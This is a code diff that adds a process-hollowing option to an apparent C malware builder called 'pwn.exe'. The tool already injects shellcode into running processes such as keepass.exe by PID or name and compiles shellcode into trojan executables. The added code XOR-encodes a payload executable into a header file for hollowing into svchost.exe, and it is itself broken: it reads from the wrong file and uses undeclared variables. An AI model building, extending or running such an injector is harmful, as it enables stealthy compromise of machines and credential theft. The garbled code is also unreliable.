@@ -27,6 +27,7 @@ int main (int argc, char **argv)
 	char *fvalue = NULL;
 	char *ivalue = NULL;
 	char *Ivalue = NULL;
+	char *Hvalue = NULL;
 	int hflag = 0;
 	int Fflag = 0;
 	int Xflag = 0;
@@ -61,7 +62,10 @@ int main (int argc, char **argv)
 				break;
 			case 'I':
 				Ivalue = optarg;
-			      	break;
+			    break;
+			case 'H':
+				Hvalue = optarg;
+					break;
 			case 'h':
 				hflag = 1;
 				break;
@@ -174,6 +178,32 @@ int main (int argc, char **argv)
 		else
 			printf("-i %s unknown option\n");
 	}
+	
+	// Process Hollowing
+	if(Hvalue)
+	{
+		// Read executable from Hvalue file and write the data into defs.h
+		printf("Write executable from %s to defs.h\n", Hvalue);
+		
+		FILE *file_exe = fopen(Hvalue, "rb");
+		FILE *file_def = fopen("defs.h", "wb");
+		
+		fprintf(file_def, "\n unsigned char payload[] = {");
+		unsigned char currentByte = 0;
+		for(int i = 0;;i++) 
+		{
+			if ((currentByte = fgetc(file_def)) == EOF) break;			
+			if (i != 0) printf(",");
+			if ((i % 12) == 0) printf("\n\t");
+			// XOR the byte with the generated key before writing it into the array
+			currentPayloadByte = currentPayloadByte ^ keys[payloadCounter];
+			printf("0x%.2X", (unsigned char) currentPayloadByte);
+			currentPayloadSize++;
+		}
+		
+		
+		// Set define
+	}
 
 	//Image name
 	if(Ivalue)
@@ -219,8 +249,10 @@ void print_help()
 	printf("\t-i shellcode for injecting shellcode\n");
 	//printf("\t-i dll for injecting a dll\n");
 	//printf("\t-i exe for injecting an executable\n");	
+	printf("-H hollow target process and insert payload executable: pwn.exe svchost.exe\n");
+	printf("\t-H mypayload.exe to set payload to inserted into the hollowed process\n");
 	printf("-P inject shellcode by PID as argument, call pwn.exe PID\n");
-	printf("-I inject shellcode by image name, call for example: pwn.exe keepass.exe\n");
+	printf("-I inject shellcode by image name, call for example: pwn.exe keepass.exe\n");	
 	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
 	printf("-f compile and execute shellcode into .exe, needs filename of shellcode file\n");
 	printf("-X compile for 64 bit\n");
